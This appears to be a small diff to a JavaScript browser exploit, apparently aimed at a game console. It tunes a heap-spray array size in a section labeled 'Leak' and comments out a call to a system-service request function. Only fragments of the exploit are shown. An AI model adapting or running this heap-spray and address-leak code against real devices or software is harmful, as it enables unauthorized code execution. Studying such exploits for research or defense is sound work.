@@ -45,9 +45,9 @@ function debug (msg) {
 //--------------------Leak---------------------------------//
 //global
 //global to use this after
-var sprayCount = 0x20000;
+var sprayCount = 0x30000;
 var ar = new Array(sprayCount);
-var vrs = new Array(100);
+var vrs = new Array(10);
 var vict = null;
 function leakAddrs (obja, objb, objc, cb)
 {
@@ -887,7 +887,7 @@ function loadRun (obj)
     
     hService = svcConnectToNamedPort();
     
-    log(svcSendSyncRequestWithUserBuffer(hService, malloc(0x1000), 0x1000));
+    //log(svcSendSyncRequestWithUserBuffer(hService, malloc(0x1000), 0x1000));
         
     while(true)
     {
